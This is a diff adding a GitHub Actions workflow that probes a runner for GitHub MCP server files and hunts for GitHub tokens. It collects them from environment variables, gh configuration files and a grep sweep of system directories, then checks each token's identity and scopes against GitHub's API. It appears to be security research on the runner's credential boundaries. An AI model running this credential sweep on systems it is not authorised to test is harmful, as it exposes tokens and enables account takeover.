@@ -1,0 +1,72 @@
+name: probe_v78_mcpcred
+on:
+  workflow_dispatch:
+jobs:
+  mcpcred:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: locate-mcp
+        continue-on-error: true
+        run: |
+          command -v github-mcp-server >/dev/null 2>&1 && echo "MARK MCP_BIN=$(command -v github-mcp-server)" || echo "MARK MCP_BIN=none-on-path"
+          find / -iname '*mcp*' -not -path '/proc/*' 2>/dev/null | grep -iE 'mcp' | head -15 | sed 's/^/MARK MCP_PATH=/'
+          (docker images 2>/dev/null | grep -i mcp | sed 's/^/MARK MCP_IMG=/') || true
+      - name: test-mcp-creds
+        continue-on-error: true
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+        run: |
+          python3 - <<'PYEOF'
+          import os, json, re, glob, urllib.request, urllib.error, subprocess
+          # ---- gather candidate credentials reachable on this VM (we are root on our own HCA) ----
+          cands = {}
+          for k in ['GITHUB_TOKEN','GITHUB_PERSONAL_ACCESS_TOKEN','GH_TOKEN','GH_PAT',
+                    'MCP_GITHUB_TOKEN','GITHUB_MCP_TOKEN','GITHUB_APP_TOKEN']:
+              v = os.environ.get(k,'')
+              if v: cands[k] = v
+          # gh cached logins
+          for p in glob.glob('/home/*/.config/gh/hosts.yml') + ['/root/.config/gh/hosts.yml','/etc/gh/hosts.yml']:
+              try:
+                  for line in open(p):
+                      m = re.search(r'oauth_token:\s*(\S+)', line)
+                      if m: cands['ghhosts:'+p] = m.group(1)
+              except Exception: pass
+          # filesystem token sweep (config/env files the MCP server might read)
+          try:
+              out = subprocess.check_output(
+                  "grep -rIoE 'gh[posru]_[A-Za-z0-9]{20,}' /opt /etc /home /root /usr/local 2>/dev/null | head -20",
+                  shell=True, stderr=subprocess.DEVNULL).decode()
+              for ln in out.splitlines():
+                  mm = re.search(r'(gh[posru]_[A-Za-z0-9]{20,})', ln)
+                  src = ln.split(':',1)[0]
+                  if mm: cands['fs:'+src] = mm.group(1)
+          except Exception: pass
+
+          def whoami(t):
+              r = urllib.request.Request('https://api.github.com/user')
+              r.add_header('Authorization','Bearer ' + t); r.add_header('Accept','application/vnd.github+json')
+              try:
+                  resp = urllib.request.urlopen(r, timeout=15)
+                  return '200 login=%s scopes=[%s]' % (json.loads(resp.read()).get('login'),
+                                                        resp.headers.get('x-oauth-scopes',''))
+              except urllib.error.HTTPError as e:
+                  return '%s %s' % (e.code, e.read(60).decode('utf-8','replace').replace(chr(10),' '))
+              except Exception as e:
+                  return 'ERR ' + str(e)[:50]
+
+          jt = os.environ.get('GITHUB_TOKEN','')
+          print('MARK JOBTOKEN_ID=%s' % (whoami(jt) if jt else 'no-job-token'))
+          distinct = 0
+          seen = {jt}
+          for k, v in cands.items():
+              if v in seen:
+                  print('MARK CAND[%s]=(same-as-job-token)' % k); continue
+              seen.add(v); distinct += 1
+              print('MARK CAND[%s](DISTINCT) -> %s' % (k, whoami(v)))
+          if distinct == 0:
+              print('MARK RESULT=only-job-scoped-token-reachable -> Informative (no broader credential; MCP would use the repo-scoped job token)')
+          else:
+              print('MARK RESULT=%d DISTINCT credential(s) reachable -> inspect identity/scopes above for a cross-repo/org boundary' % distinct)
+          PYEOF
